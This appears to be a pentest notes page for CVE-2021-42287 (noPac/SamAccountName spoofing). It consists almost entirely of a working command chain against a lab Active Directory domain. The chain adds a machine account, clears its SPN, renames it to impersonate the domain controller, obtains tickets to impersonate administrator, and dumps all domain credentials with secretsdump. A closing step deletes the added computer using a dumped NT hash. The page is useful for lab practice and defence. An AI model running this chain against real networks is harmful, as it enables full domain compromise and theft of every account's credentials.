---
description: CVE-2021-42287
---

# SamAccountName (nopac)





```
// Get the MAQ of the domain
cme ldap winterfell.north.sevenkingdoms.local -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M MAQ

// add a computer
addcomputer.py -computer-name 'samaccountname$' -computer-pass 'ComputerPassword' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'

// clear the SPN
addspn.py --clear -t 'samaccountname$' -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' 'winterfell.north.sevenkingdoms.local'

// rename the computer (computer -> DC)
renameMachine.py -current-name 'winterfell' -new-name 'samaccount$' north.sevenkingdoms.local/jon.snow:iknownothing

// Obtain a TGT
getTGT.py -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell':'ComputerPassword'

// Reset the computer name back to the original
renameMachine.py -current-name 'winterfell' -new-name 'samaccount$' north.sevenkingdoms.local/jon.snow:iknownothing

// Obtain a service ticket with S4U2self by presenting the previous TGT
export KRB5CCNAME=/workspace/winterfell.ccache
getST.py -self -impersonate 'administrator' -altservice 'CIFS/winterfell.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell' -debug

// DCSync by presenting the service ticket
export KRB5CCNAME=/workspace/administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
secretsdump.py -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' @'winterfell.north.sevenkingdoms.local'

// And voilà, we got all the north domain ntds.dit informations :)
// Now clean up by deleting the computer we created with the administrator account hash we just get

addcomputer.py -computer-name 'samaccountname$' -delete -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH -hashes 'aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4' 'north.sevenkingdoms.local/Administrator'


```

cme ldap winterfell.north.sevenkingdoms.local -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M MAQ

MAQ: MachineAccountQuota is the maximum number of machines that a non-privileged user can add to an AD.
